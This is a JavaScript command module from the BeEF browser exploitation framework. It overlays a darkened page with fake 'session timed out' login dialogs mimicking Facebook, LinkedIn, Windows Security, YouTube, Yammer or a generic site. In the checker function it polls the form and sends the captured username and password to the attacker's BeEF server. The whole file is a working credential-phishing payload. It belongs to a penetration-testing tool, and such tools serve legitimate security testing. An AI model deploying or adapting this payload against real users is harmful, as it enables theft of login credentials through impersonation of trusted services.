//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
	imgr = "<%== @imgsauce %>";
	var answer= '';
	// set up darkening
	function grayOut(vis, options) {
	  // Pass true to gray out screen, false to ungray
	  // options are optional.  This is a JSON object with the following (optional) properties
	  // opacity:0-100         // Lower number = less grayout higher = more of a blackout 
	  // zindex: #             // HTML elements with a higher zindex appear on top of the gray out
	  // bgcolor: (#xxxxxx)    // Standard RGB Hex color code
	  // grayOut(true, {'zindex':'50', 'bgcolor':'#0000FF', 'opacity':'70'});
	  // Because options is JSON opacity/zindex/bgcolor are all optional and can appear
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || 50;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    //if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	    //    var pageWidth = document.body.scrollWidth+'px';
	    //    var pageHeight = document.body.scrollHeight+'px';
	    //} else if( document.body.offsetWidth ) {
	    //  var pageWidth = document.body.offsetWidth+'px';
	    //  var pageHeight = document.body.offsetHeight+'px';
	    //} else {
	    
	    // Previous lines were not rendering page background correctly
	       var pageWidth='100%';
	       var pageHeight='100%';
	    //}
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	}

	// CURRENTLY NOT USED
	// Send done prompt to user
	function win(){
		document.getElementById('popup').innerHtml='<h2>Thank you for re-authenticating, you will now be returned to the application</h2>';
		answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;
	}


	// Check whether the user has entered a user/pass and pressed ok
	function checker(){
		uname1 = document.getElementById("uname").value;
		pass1 = document.getElementById("pass").value;
		valcheck = document.getElementById("buttonpress").value;
		
		if (uname1.length > 0 && pass1.length > 0 && valcheck == "true") {
			// Join user/pass and send to attacker
			answer = uname1+":"+pass1
  			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
			// Set lastchild invisible
			document.body.lastChild.setAttribute('style','display:none');
			clearInterval(credgrabber);
			// Lighten screen
			grayOut(false);
			$j('#popup').remove();
			$j('#darkenScreenObject').remove();

		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
			// If user has not entered any data, reset button
			document.body.lastChild.getElementById("buttonpress").value = "false";
			alert("Please enter a valid username and password.");		
		}
	}


	// Facebook floating div
	function facebook() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);
		
		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-radius:8px"';
		var windowmain = 'style="border:1px #555 solid;"';
 		var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(109, 132, 180);font-size: 13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: left;height: 18px;"';
		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: tahoma,verdana,arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color: rgb(109,132,180);"';	
		var buttonstyle = 'style="font-size: 13px;background:#627aac;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
 
        	var title = 'Facebook Session Timed Out';
	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
        	var buttonLabel = '<input type="button" name="ok" value="Log in" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';
		
		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}


	// Linkedin floating div
	function linkedin() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain = 'style="border:1px #555 solid;"';
 		var tbarstyle = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';

//-moz-box-shadow: 0 1px 4px #ccc;-webkit-box-shadow: 0 1px 4px #CCC;-o-box-shadow: 0 1px 4px #ccc;box-shadow: 0 1px 4px #CCC;

		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var lilogo = 'http://press.linkedin.com/display-media/209/1';
        	var title = 'Session Timed Out <img src="' + lilogo + '" align=right height=20 width=70 alt="LinkedIn">';
	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
        	var buttonLabel = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}

	// Windows floating div
	function windows() {
		sneakydiv = document.createElement('div');
                sneakydiv.setAttribute('id', 'popup');
                sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:#ffffff;border-radius:6px;');
                document.body.appendChild(sneakydiv);

                // Set appearance using styles, maybe cleaner way to do this with CSS block?

		// Set window border
		var edgeborder = 'style="border:1px #000000 solid;border-radius:6px;"';
		var windowborder  = 'style="width:400px;border: 7px #CFE7FE solid;border-radius:6px;"';

		var windowmain    = 'style="border:1px #000000 solid;"';

		var titlebarstyle = 'style="background:#CFE7FE;height:19px;font-size:12px;font-family:Segoe UI;"';
		var titlebartext = 'Windows Security';

		var promptstyle = 'style="height:40px;"';
		var titlestyle = 'style="align:left;font-size:14px;font-family:Segoe UI;margin:10px 15px;line-height:100%;color:0042CE;"';
		var title = 'Enter Network Password';
		var bodystyle = 'style="align:left;font-size:11px;font-family:Segoe UI;margin:10px 15px;line-height:170%;"';
		var body = 'Enter your password to connect to the server';
		var dividestyle = 'style="border-bottom:1px solid #DFDFDF;height:1px;width:92%;margin-left:auto;margin-right:auto;"';

		var tablestyle = 'style="background:#CFE7FE;width:90%;margin-left:auto;margin-right:auto;border:1px solid #84ACDD;border-radius:6px;height:87px"';
		var logobox = 'style="border:4px #84ACDD solid;border-radius:7px;height:45px;width:45px;background:#ffffff"';
		var logo = 'style="border:1px #000000 solid;height:43px;width:42px;background:#CFE7FE;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#EEF2F4, endColorstr=#CCD8DF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFE7FE));background: -moz-linear-gradient(top,  #EEF2F4,  #CCD8DF);"';

		var inputboxstyle = 'style="width:140px;font-size:11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#666666;color:#000000;border-radius:3px;"';

		var credstextstyle = 'style="font-size:11px;font-family:Segoe UI;"';

		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#000000;border: 1px #29447e solid;padding: 3px 3px 3px 3px;margin-right:5px;border-radius:5px;width:70px;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#ffffff, endColorstr=#CFCFCF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFCFCF));background: -moz-linear-gradient(top,  #ffffff,  #CFCFCF);"';
		var buttonLabel  = '<input type="button" name="ok" value="OK" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		var bbarstyle     = 'style="background-color:#F0F0F0;padding:8px;text-align:right;border-top: 1px solid #DFDFDF;height:28px;margin-top:10px;"';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="edge" '+edgeborder+'><div id="window_container" '+windowborder+ '><div id="title_bar" ' +titlebarstyle+ '>' +titlebartext+ '</div><div id="windowmain" ' +windowmain+ '><div id="prompt" '+promptstyle+'><p><span ' +titlestyle+ '>' +title+ '</span><br/><span ' +bodystyle+ '>' + body + '</span></div><div id="divide" ' +dividestyle+ '></div></p><table ' +tablestyle+ '><tr><td rowspan="3" width=75px align="center"><div id="logobox" ' +logobox+ '><div id="logo" ' +logo+ '></div></div></td><td align="left"><input type="text" id="uname" placeholder="User name" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="left"><input type="password" id="pass" name="pass" placeholder="Password" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td><input type="checkbox"><span ' +credstextstyle+ '>Remember my credentials</span></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);
	}

	// YouTube floating div
	function youtube() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain    = 'style="border:1px #555 solid;"';
 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var logo  = 'http://www.youtube.com/yt/brand/media/image/yt-brand-standard-logo-630px.png';
		var title = 'Session Timed Out <img src="' + logo + '" align=right height=20 width=70 alt="YouTube">';
		var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
		var buttonLabel  = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Username: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);

	}

	// Yammer floating div
	function yammer() {

		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;');
		document.body.appendChild(sneakydiv);

		// Set appearance using styles, maybe cleaner way to do this with CSS block?
		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
		var windowmain    = 'style="border:1px #555 solid;"';
 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
		var logo  = 'https://www.yammer.com/favicon.ico';
		var title = 'Session Timed Out <img src="' + logo + '" align=right height=24 width=24 alt="Yammer">';
		var messagewords = 'Your Yammer session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
		var buttonLabel  = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

		// Build page including styles
		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Username: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';

		// Repeatedly check if button has been pressed
		credgrabber = setInterval(checker,1000);

	}

	// Generic floating div with image
	function generic() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'popup');
		sneakydiv.setAttribute('style', 'width:400px;position:absolute; top:20%; left:40%; z-index:51; background-color:white;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
		sneakydiv.setAttribute('align', 'center');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"buttonpress\").value=\"true\";\' value=\'Ok\'><br/><input type="hidden" id="buttonpress" name="buttonpress" value="false"/>';
		
		// Repeatedly check if button has been pressed		
		credgrabber = setInterval(checker,1000);

	}
	
	// Set background opacity and apply background 
	var backcolor = "<%== @backing %>";	  
	if(backcolor == "Grey"){
		grayOut(true,{'opacity':'70'});
	} else if(backcolor == "Clear"){
		grayOut(true,{'opacity':'0'});
	}

	// Retrieve the chosen div option from BeEF and display
	var choice = "<%= @choice %>";	
	switch (choice) {
		case "Facebook":
			facebook(); break;
		case "LinkedIn":
			linkedin(); break;
		case "Windows":
			windows(); break;
		case "YouTube":
			youtube();  break;
		case "Yammer":
			yammer();   break;
		default:
			generic();  break;
	}

});
